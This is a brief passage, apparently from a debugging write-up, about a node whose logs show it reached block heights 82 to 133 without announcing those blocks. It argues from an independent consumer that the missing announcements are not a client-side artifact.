Meanwhile the same log file reports **20 distinct `best: #N` values inside 82–133**, proving the node did reach those heights. It had the blocks and never announced them. Because this consumer is independent of the test client, the silence cannot be a client-side artifact.
